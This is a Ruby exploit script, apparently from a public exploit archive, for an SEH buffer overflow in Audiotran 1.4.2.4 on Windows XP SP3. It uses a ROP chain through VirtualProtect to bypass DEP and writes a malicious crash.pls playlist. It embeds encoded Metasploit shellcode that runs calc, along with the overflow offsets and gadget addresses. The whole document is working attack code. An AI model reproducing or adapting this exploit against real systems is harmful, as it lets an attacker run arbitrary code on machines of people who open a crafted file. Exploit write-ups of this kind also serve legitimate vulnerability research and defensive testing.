# Exploit Title: Audiotran 1.4.2.4 SEH Overflow Exploit (DEP Bypass)
# Date: 09/20/10
# Credit/Bug found by : Author Abhishek Lyall - abhilyall[at]gmail[dot]com, info[at]aslitsecurity[dot]com
# Author: Muhamad Fadzil Ramli - mind1355 at gmail dot com
# Software Link: http://www.e-soft.co.uk/Audiotran.htm
# Version: 1.4.2.4
# Tested on: Windows XP SP3 EN  (Virtualbox 3.2.8 r64453)
# CVE: N/A
# greetz to PVE (corelanc0d3r - great tutorial) & Intranium Pentester

#! /usr/bin/env ruby

# windows/exec - 144 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc

payload =  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc"
payload << "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78"
payload << "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85"
payload << "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5"
payload << "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c"
payload << "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21"
payload << "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5"
payload << "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27"
payload << "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3"
payload << "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53"
payload << "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f"
payload << "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6"
payload << "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8"
payload << "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
payload << "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f"
payload << "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"

head	= "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D"
junk1	= "A" * 264
seh	= [0x73512733].pack('V') 		# ADD     ESP, 1004 # RETN 	[Module : MSVBVM60.DLL]
retslide = [0x73512739].pack('V') * 624 	# RETN SLIDE

# ROP1
rop1	= ''
rop1 	<< [0x775BB15D].pack('V')		# PUSH    ESP # POP     EDI # XOR     EAX, EAX # POP     EBX # POP     ESI # POP     EBP # RETN    8 	[Module : ole32.dll]
rop1	<< "PPPP" * 3				# PADDING
rop1	<< [0x77C1E842].pack('V')		# PUSH    EDI # POP     EAX # POP     EBP # RETN 	[Module : msvcrt.dll]
rop1	<< "PPPP" * 3				# PADDING
rop1	<< [0x055FB8D2].pack('V') 		# ADD     ESP, 20 # RETN 	[Module : threed32.ocx]
# END

# VIRTUALPROTECT
params	= ''
params << [0x7C801AD4].pack('V') 		# VirtualProtect
params << 'WWWW'   				# return address (param1)
params << 'XXXX'   				# lpAddress      (param2)
params << 'YYYY'   				# Size           (param3)
params << 'ZZZZ'   				# flNewProtect   (param4)
params << [0x10051005].pack('V');  		# writeable address
params << 'PPPP' * 2
# END

# ROP2
# WRITE PARAM 1
# ADD ESP,20 LANDS HERE
rop2	= ''
rop2	<< [0x73511C1F].pack('V')		# PUSH    EDI # ADD     AL, 5F # POP     ESI # POP     EBP # POP     EBX # RETN 	[Module : MSVBVM60.DLL]
rop2	<< "PPPP" * 2				# PADDING
rop2	<< [0x76CAA6AA].pack('V')		# XOR     EAX, EAX # RETN 	[Module : IMAGEHLP.dll]
rop2	<< [0x77C1E842].pack('V')		# PUSH    EDI # POP     EAX # POP     EBP # RETN 	[Module : msvcrt.dll]
rop2	<< "PPPP"				# PADDING
rop2	<< [0x74872AE6].pack('V')		# ADD     EAX, 120 # POP     EBP # RETN    4
rop2	<< "PPPP"				# PADDING
rop2	<< [0x7CB17E80].pack('V')		# MOV     DWORD PTR DS:[ESI+24], EAX # MOV     EAX, ESI # POP     ESI # RETN 	[Module : SHELL32.dll]
rop2	<< "PPPP" * 2
# END

# WRITE PARAM 2
rop2	<< [0x775D13AE].pack('V')		# PUSH    EAX # POP     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x74872AE6].pack('V')		# ADD     EAX, 120 # POP     EBP # RETN    4
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x7CB17E80].pack('V')		# MOV     DWORD PTR DS:[ESI+24], EAX # MOV     EAX, ESI # POP     ESI # RETN 	[Module : SHELL32.dll]
rop2	<< "PPPP"
# END

# WRITE PARAM 3
rop2	<< [0x775D13AE].pack('V')		# PUSH    EAX # POP     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x76CAA6AA].pack('V')		# XOR     EAX, EAX # RETN 	[Module : IMAGEHLP.dll]
rop2	<< [0x77C4EC2B].pack('V')		# ADD     EAX, 100 # POP     EBP # RETN 	[Module : msvcrt.dll]
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77C4EC2B].pack('V')		# ADD     EAX, 100 # POP     EBP # RETN 	[Module : msvcrt.dll]
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77C4EC2B].pack('V')		# ADD     EAX, 100 # POP     EBP # RETN 	[Module : msvcrt.dll]
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x7CB17E80].pack('V')		# MOV     DWORD PTR DS:[ESI+24], EAX # MOV     EAX, ESI # POP     ESI # RETN 	[Module : SHELL32.dll]
rop2	<< "PPPP"
# END

# WRITE PARAM 4
rop2	<< [0x775D13AE].pack('V')		# PUSH    EAX # POP     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x76CAA6AA].pack('V')		# XOR     EAX, EAX # RETN 	[Module : IMAGEHLP.dll]
rop2	<< [0x77C4EC1D].pack('V')		# ADD     EAX, 40 # POP     EBP # RETN 	[Module : msvcrt.dll
rop2	<< "PPPP"				# PADDING
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x77571088].pack('V')		# INC     ESI # RETN 	[Module : ole32.dll]
rop2	<< [0x7CB17E80].pack('V')		# MOV     DWORD PTR DS:[ESI+24], EAX # MOV     EAX, ESI # POP     ESI # RETN 	[Module : SHELL32.dll]
rop2	<< "PPPP"
# END

# POINT ESP TO VIRTUALPROCTECT
rop2	<< [0x61AB06F9].pack('V')		# ADD     EAX, 4 # RETN 	[Module : MFC40.DLL]
rop2	<< [0x61AB06F9].pack('V')		# ADD     EAX, 4 # RETN 	[Module : MFC40.DLL]
rop2	<< [0x61AB06F9].pack('V')		# ADD     EAX, 4 # RETN 	[Module : MFC40.DLL]
rop2	<< [0x61AB06F9].pack('V')		# ADD     EAX, 4 # RETN 	[Module : MFC40.DLL]
rop2	<< [0x61AB06F9].pack('V')		# ADD     EAX, 4 # RETN 	[Module : MFC40.DLL]
rop2	<< [0x27598BEE].pack('V')		# XCHG    EAX, ESP # RETN 	[Module : Mscomctl.ocx]
# END

nops	= "\x90" * 300
junk2	= "C" * (10000 - (head + junk1 + seh + retslide + rop1 + params + rop2 + nops + payload).length)
data	= head + junk1 + seh + retslide + rop1 + params + rop2 + nops + payload + junk2

File.open("crash.pls", 'w') do |b|
	b.write data
	puts "file size : " + data.length.to_s
end